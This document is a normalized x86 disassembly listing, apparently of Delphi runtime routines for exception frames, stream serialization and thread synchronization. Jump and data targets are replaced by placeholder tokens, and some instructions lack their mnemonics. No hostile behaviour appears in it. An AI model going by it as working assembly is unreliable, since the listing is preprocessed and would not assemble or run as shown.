push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403f94
jmp r-xdata
mov eax [ ebx ]
call sub_417a20
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409118
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ce08
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d123
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d1f0
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41d101
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d0c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d214
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d214
mov eax [ ebp - 0x1c ]
call sub_4175f4
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d214
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41d214
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41cda8
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d214
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4030b4
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417344
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41d067
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_406000
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_417d38
xor eax eax
push ebp
push sub_41d047
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_417ef0
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d04e
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_40316c
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_417e94
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41d098
call sub_40276c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403974
jmp r-xdata
call sub_403920
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41b19c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d108
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41d0c7
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41b344
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403920
call sub_403974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d108
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_40316c
sub_41d134
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d1de
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d1b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d3f0
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4148e0
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41b48c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41b4c4
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1e5
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d214
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41d214
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41b9b4
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404030
mov eax esi
call j_sub_40440c
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41b9b4
pop edx
pop esi
pop ebx
retn
sub_41d250
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d2fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41b990
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41d30c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4041c8
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d304
lea eax [ ebp - 0x8 ]
call sub_404620
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41d3f0
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41b9b4
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40458c
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41b9b4
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41b9b4
jmp r-xdata
jmp r-xdata
call sub_41b48c
sub_41d30c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d3e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41b990
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d250
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40476c
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3ea
lea eax [ ebp - 0xc ]
call sub_403f40
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41d3f0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41b9b4
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404868
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41b9b4
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41b9b4
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40458c
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41b9b4
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405ca0
jmp r-xdata
jmp r-xdata
call sub_41b48c
sub_41d404
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d440
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d214
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d447
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_41d44c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41b64c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41d500
mov eax [ ebx ]
call sub_41c5b8
pop ebx
pop ebp
retn
sub_41d474
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41b9b4
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d8f8
pop ebx
pop ecx
pop ebp
retn
sub_41d4a4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41b64c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41b990
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41c5b8
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41d8f8
jmp r-xdata
mov eax [ ebx ]
call sub_41d500
mov eax [ ebx ]
call sub_41b64c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41d69c
mov eax [ ebx ]
call sub_41c5b8
sub_41d500
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d68f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d3f0
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d696
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
jmp [ eax * 4 + jump_table_41d537 ]
push ebp
call sub_41d44c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41d8f8
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41d8f8
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41d8f8
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41d8f8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d214
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d474
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d404
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d474
pop ecx
jmp r-xdata
push ebp
call sub_41d4a4
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41d8f8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41d8f8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41d8f8
jmp r-xdata
push ebp
mov eax 0x2
call sub_41d474
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41d8f8
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d474
pop ecx
sub_41d69c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d6d9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d214
mov eax ebx
call sub_41d500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d6e0
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_41d6e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41d77c
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41b64c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d214
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41d214
jmp r-xdata
mov eax ebx
call sub_41d69c
mov eax ebx
call sub_41c5b8
jmp r-xdata
mov eax ebx
call sub_41b64c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41d6e4
mov eax ebx
call sub_41c5b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d783
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
sub_41d78c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d831
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403fd8
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41ebe0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d838
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
sub_41d85c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41d884
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41b8e4
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_417534
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403398
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41b8e4
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41d8f8
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41b9b4
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41b9b4
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41d940
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41dae9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41b518
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dac4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41b9b4
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41a444
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41b9b4
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41add4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41da9f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d250
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41b9b4
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41a444
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41b9b4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_414530
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
lea eax [ ebp - 0x1c ]
call sub_4058d0
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d3e0
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41daa6
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub_41db08
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dd02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f094
mov eax [ ebp - 0x4 ]
call sub_41b990
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
jmp [ eax * 4 + jump_table_41db4a ]
mov eax [ ebp - 0x4 ]
call sub_41d3f0
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c500
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_4131fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c500
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_4131fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c500
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4131fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2e4
mov eax ebx
call sub_4133f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c328
mov eax ebx
call sub_4133f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c36c
mov eax ebx
call sub_41341c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c3bc
mov eax ebx
call sub_413408
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d250
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_413430
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41d30c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41345c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3f0
cmp al 0x9
sete dl
mov eax ebx
call sub_4133cc
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41d940
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f3bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c56c
push edx
push eax
mov eax ebx
call sub_4132f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd09
lea eax [ ebp - 0x1c ]
call sub_40f0a8
lea eax [ ebp - 0xc ]
call sub_404620
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov eax ebx
call sub_414618
jmp r-xdata
sub_41dd10
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41dd5c
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41dd88
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41def8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41dd10
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41def8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41dd10
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41def8
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41dd10
jmp r-xdata
pop edx
pop ebx
retn
sub_41de0c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_40434c
je r-xdata
mov eax esi
call sub_404200
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404200
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41def8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41dd10
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41dd10
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41def8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41dd10
mov dl 0x6
mov eax ebx
call sub_41def8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41dd10
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41dd10
sub_41dea4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41dee9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405d44
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41de0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41def0
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_41dfa4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
call sub_41df58
mov eax ebx
call sub_41df64
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41e132
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e113
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e11a
mov eax [ ebp - 0xc ]
call sub_40316c
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_417e94
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_417d84
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41e0dd
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41e0ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41e144
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41df80
test bl bl
